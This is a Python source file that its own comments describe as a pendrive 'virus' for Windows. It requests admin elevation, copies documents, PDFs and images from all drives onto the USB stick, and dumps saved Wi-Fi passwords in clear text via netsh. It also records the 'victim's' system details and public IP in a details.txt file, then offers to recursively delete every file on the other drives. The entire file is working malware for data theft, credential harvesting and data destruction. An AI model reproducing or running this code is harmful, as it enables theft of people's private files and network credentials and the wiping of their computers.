import os
import sys
import time
from datetime import datetime
import subprocess
from tabulate import tabulate
try :
    import win32com.shell.shell as shell
except Exception as e:
    print("Error occured :",e)
import shutil
ASADMIN = 'asadmin'



"""
All work done
Just change the target directories when inserting this virus in pendrive
"""


"""
Coding completed :
copying files is completed
now write code to format the drive
and also try to hide the console while copying files
"""


"""
First we have to copy all important files(only files) in the pendrive

And if user has given a specific file name, then look for that file first, or else copy all important files

Then try to format all the other drives
"""


# ______________________Global Variables______________________

pendrivePath = os.getcwd()
print("Pendrive path is :",pendrivePath)
now = datetime.now()
d1 = now.strftime(r"%d/%m/%Y %H:%M:%S")

allDrives = ['c:\\','d:\\','e:\\','f:\\','g:\\']
#allDrives = ["D:\\other\\virusTestingFolder\\"]

C_folders_to_be_skipped = ['$Recycle.Bin', '$WinREAgent', 'bootmgr', 'BOOTNXT', 'Documents and Settings', 'DumpStack.log.tmp', 'hiberfil.sys', 'Intel', 'OneDriveTemp', 'pagefile.sys', 'PerfLogs', 'Program Files', 'Program Files (x86)', 'ProgramData', 'Recovery', 'swapfile.sys', 'System Volume Information', 'Windows']
filesNotToCopy = []
allExtenstionsToCopy = [".pdf",".jpeg",".txt"]
extensionsType = {
                "pdf":[".pdf",".ps",],
                "text":[".txt"],
                "documents" : [".doc",".docx",".xml",".wps",".csv",".dbf",".xls",".xlsb",".xlsx",".xlm"],
                "image":[".png",".jpeg",".jpg",".gif",".raw",".bmp"],
                "other" : [".html"],
                "avoid" : [".exe",".mp3",".mp4"]
}




# ___________________CLASS WIFI PASSWORD_____________________

class WifiPassword():
    def __init__(self) -> None:
        self.allWifiNames = []
        self.wifiNames = []
        self.paswords = []
        self.wifiNamesWithPasword = {}
        self.NoOFPasswordNotFound = 0

        self.meta_data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'])
        # decoding meta data
        self.data = self.meta_data.decode('utf-8', errors ="backslashreplace")
        # splitting data by line by line
        self.data = self.data.split('\n')
        self.runner()


    def runner(self):
        self.profileGetter()
        self.passwordGetter()
        # print(self.wifiNamesWithPasword)

        print()
        if self.NoOFPasswordNotFound==0:
            print("Sir, I have sucessfully found passwords for all wifi networks")
        else:
            found = len(list(self.wifiNamesWithPasword.keys()))
            notFound = self.NoOFPasswordNotFound
            print(f"Sir, I have found passwords of {found} networks out of {found+notFound}  ")


    def profileGetter(self):
        newL = []
        # Getting all the names of wifi
        for i in self.data:
            if "All User Profile" in i:
                newL.append(i)
        # Stripping whitspaces and unnecessary things from names
        for p in newL:
            name = ""
            startAppending = False
            for q in p:
                if startAppending:
                    name+=str(q)
                if q==":":
                    startAppending = True
                if q=="\\":
                    startAppending = False
            self.allWifiNames.append(name)
        self.wifiNames = []
        for name in self.allWifiNames:
            name = name.rstrip()
            newName = name.replace(" ","",1)
            self.wifiNames.append(newName)


    def passwordGetter(self):
        for i in self.wifiNames:
            try :
                # Getting password of all wifi networks
                wifiName = i
                print('Trying to get password for = "{0}"'.format(i))
                meta_data_password = subprocess.check_output(['netsh', 'wlan', 'show', 'profile',f"{wifiName}",'key=clear'])
                meta_data_password = meta_data_password.decode("UTF-8")
                meta_data_password = meta_data_password.split("\n")

                # Checking if the wifi is open or it has password
                isWifiOpen = None
                for i in meta_data_password:
                    if "Authentication" in i:
                        if "Open" in i:
                            isWifiOpen = True
                        else:
                            isWifiOpen = False

                # Stripping whitspaces and unnecessary things from password
                password = ""
                if not isWifiOpen:
                    for p in meta_data_password:
                        if "Key Content" in p:
                            name = ""
                            startAppending = False
                            for q in p:
                                if startAppending:
                                    name+=str(q)
                                if q=="\\":
                                    startAppending = False
                                if q==":":
                                    startAppending = True
                            password=name
                    password = password.rstrip()
                    password = password.replace(" ","")
                else:
                    password = "WIFI IS OPEN"
                self.wifiNamesWithPasword[wifiName] = password

            # Handling any error if it arises
            except Exception as e:
                self.NoOFPasswordNotFound+=1




# ______________________Main Class______________________

class Main():
    def __init__(self):
        self.startTime = time.time() # This is the start time of program
        self.dateTime = d1
        self.allFiles = []
        self.filesToCopy = []
        self.allDrives = allDrives
        self.Folders_to_be_skipped = []
        self.Folders_to_be_skipped.extend(C_folders_to_be_skipped)
        self.extensionType = extensionsType
        self.allPdfFiles = []
        self.allTextFiles = []
        self.allDocumentFiles = []
        self.allImageFiles = []
        self.other = []


        # ______________________Making the "allFIles" folder______________________
        if os.path.isdir((pendrivePath+r"\allFiles")):
            self.destinationPath = pendrivePath+r"\\allFiles"
        else:
            os.mkdir((pendrivePath+r"\allFiles"))
            self.destinationPath = pendrivePath+r"\\allFiles"

        # ______________________Making all folders in allFiles______________________
        try:
            os.mkdir((self.destinationPath+"\\pdf"))
            self.destinationPathPdf = self.destinationPath+"\\pdf"
        except FileExistsError as fee:
            self.destinationPathPdf = self.destinationPath+"\\pdf"
        try:
            os.mkdir((self.destinationPath+"\\document"))
            self.destinationPathDocument = self.destinationPath+"\\document"
        except FileExistsError as fee:
            self.destinationPathDocument = self.destinationPath+"\\document"
            # self.destinationPathText = self.destinationPath+"\\document"
        try:
            os.mkdir((self.destinationPath+"\\other"))
            self.destinationPathOther = self.destinationPath+"\\other"
        except FileExistsError as fee:
            self.destinationPathOther = self.destinationPath+"\\other"

            # __________Making details file in allFiles___________
            if os.path.isfile((self.destinationPath+"\\details.txt")):
                self.destinationPathDetailsFile = (self.destinationPath+"\\details.txt")
            else:
                with open ((self.destinationPath+"\\details.txt"),"w") as fp:
                    self.destinationPathDetailsFile = (self.destinationPath+"\\details.txt")

        # ______________________Trying to get admin acess______________________
        try:
            self.getAdminAcess()
        except Exception as e:
            print("Can't get admin acess")
            print(e)


        # ______________________Running all the functions______________________
        self.analysing()
        self.finalizing()
        self.copyAllFiles()
        self.endTime = time.time() # This will get the ending time of function
        self.timeElasped = self.endTime - self.startTime
        self.getWifiPasswordFun()
        self.systemDetails()
        self.gettingDetails()
        os.system('cls')
        print("Sir all the work has been done")


    def getAdminAcess(self):
        """
        This functions gets admin acess
        """
        if sys.argv[-1] != ASADMIN:
            script = os.path.abspath(sys.argv[0])
            params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
            shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters=params)
            # sys.exit(0)

    def systemDetails(self):
        """
        This function gets all the system details like ip address and computers info and stores in a list called self.systemDetailsList and ip address in a variable called self.realIpAddress
        """
        print("Getting all the system details.......")
        Id = subprocess.check_output(['systeminfo']).decode('utf-8').split('\n')
        new = []
        finalList = []
        # arrange the string into clear info
        for item in Id:
            new.append(str(item.split("\r")[:-1]))
        for i in new:
            # print(i[2:-2])
            finalList.append(i[2:-2])

        realIpAddress = subprocess.check_output("nslookup myip.opendns.com resolver1.opendns.com",shell=True)
        realIpAddress = realIpAddress.decode('UTF-8')

        self.realIpAddress = realIpAddress
        self.systemDetailsList = finalList

    def stringLower(self,a):
        """
        This functions takes a string, lowers it and returns it
        """
        b = ''
        for i in a:
            if str(i).isalpha:
                if str(i).isupper():
                    b+=(str(i).lower())
                else:
                    b+=str(i)
            else:
                b+=str(i)
        return b

    def analysing(self):
        """
        This function will makes a list of all the files in the system
        """
        def fun(path):
            try:
                for i in os.listdir(path):
                    if os.path.isdir(path+i):
                        if i in self.Folders_to_be_skipped:
                            # print("Folder skipped :",i) #Folder will be skipped
                            continue
                        else:
                            fun(path+i+"\\")
                    else:
                        self.allFiles.append((path+i))

            except PermissionError as e:
                # print(e)
                pass

        for drives in self.allDrives:
                fun(drives)

        # print(self.allFiles)
        return None


    def finalizing(self):
        """
        This function sorts file on basis of their extension
        """
        for i in self.allFiles:
            a = os.path.splitext(i)
            a = list(a)
            a[1] = self.stringLower(a[1])
            if a[1] in self.extensionType["pdf"]:
                self.allPdfFiles.append(i)
            elif a[1] in self.extensionType["text"]:
                self.allTextFiles.append(i)
            elif a[1] in self.extensionType["documents"]:
                self.allDocumentFiles.append(i)
            elif a[1] in self.extensionType["image"]:
                self.allImageFiles.append(i)
            elif a[1] in self.extensionType["other"]:
                self.other.append(i)
            else:
                continue

    def copyAllFiles(self):
        """
        This function will copy all the files
        """
        def copyFun(listOfFiles,destination):
            for i in listOfFiles:
                try :
                    os.system("@echo off")
                    os.system(f'copy "{i}" "{destination}"')
                except Exception as e:
                    print("\n")
                    print("Error occured while copying",e)
                    print(i)
                    print("\n")
        copyFun(self.allPdfFiles,self.destinationPathPdf)
        copyFun(self.allTextFiles,self.destinationPathDocument)
        copyFun(self.allDocumentFiles,self.destinationPathDocument)
        copyFun(self.allImageFiles,self.destinationPathOther)
        copyFun(self.other,self.destinationPathOther)
        # os.system('cls')
        print("\n")
        print("Sir all the files have been copied")
        return None

    def gettingDetails(self):
        """
        Details we want :
        1. Last file copied
        2. First file copied
        3. Total number of files
        4. Names of all the file
        5. Time taken to copy all files
        6. Total size of all the files
        7. Date and time the files were copied
        8. Name, ip adress and all details of the victim's pc
        """
        lastFileCopied = self.allFiles[-1]
        firstFileCopied = self.allFiles[0]
        totalFiles = len(self.allFiles)
        allFiles = self.allFiles
        timeElasped = self.timeElasped
        totalSize = None
        DateAndTime = self.dateTime
        allDetails = self.systemDetailsList
        realIpAddress = self.realIpAddress

        self.strCreator()
        wifiDetails = self.wifiTable

        allDetailsList =(f"""First File Copied = {firstFileCopied} \nSecond File Copied = {lastFileCopied} \nTotal number of files = {totalFiles}  \nTime taken to copy all files = {timeElasped} seconds \nDate and time of copying file = {DateAndTime}  \n\n""")

        with open ((self.destinationPath+"\\details.txt"),"w") as fp:
            fp.write(allDetailsList)
            fp.write("==================VICTIM'S PC DETAILS=====================\n")
            for i in allDetails:
                fp.write(i+"\n")
            fp.write("\n\n==================REAL IP ADDRESS=====================\n")
            fp.write(f"{realIpAddress}\n")            
            fp.write("\n\n==================ALL WIFI PASSWORDS=====================\n")
            fp.write(wifiDetails)
    

    def strCreator(self):
        data = []
        for i in self.wifiNamesWithPasword.keys():
            data.append([i,self.wifiNamesWithPasword[i]])

        #define header names
        col_names = ["WIFI NAME", "PASWORDS"]
        
        #display table
        self.wifiTable = tabulate(data, headers=col_names)
        


    def getWifiPasswordFun(self):
        classObject = WifiPassword()
        self.wifiNamesWithPasword = classObject.wifiNamesWithPasword
        return None



class DeletingFiles():
    def __init__(self):
        self.listOfEmptyDir = []
        self.filesToAvoid = ["$Recycle.Bin"]
        self.drives = allDrives

        self.removePendrivesPath()
        for i in self.drives:
            self.removeFiles(i)
        self.removeDir()
        print("All things deleted")


    def removePendrivesPath(self):
        """
        This function removes pendrive's path from self.drives
        """
        a = os.getcwd()
        a = Main.stringLower(None,a)
        if a in self.drives:
            self.drives.remove(a)


    def removeFiles(self,path):
        """
        This function deletes all files in the given path
        """
        try :
            for i in os.listdir(path):
                try :
                    if i in self.filesToAvoid:
                        continue
                    if os.path.isdir(path+i):
                        self.removeFiles((path+i+"\\"))
                        self.listOfEmptyDir.append(path+i)
                    else:
                        os.remove(path+i)
                except PermissionError as e:
                    continue
        except PermissionError as e:
            pass


    def removeDir(self):
        """
        This function takes a list of path of all empty directory, deletes all those directory
        """
        for i in self.listOfEmptyDir:
            # print(i)
            if i in self.filesToAvoid:
                    continue
            try :
                os.rmdir(i)
            except PermissionError as e:
                continue








if __name__ == "__main__":
    a = Main()
    print("\nDo you want to delete all the files too? \nEnter 1 for yes or else 2")
    choice = int(input())
    if choice == 1:
        b = DeletingFiles()
    else:
        print("Okay")




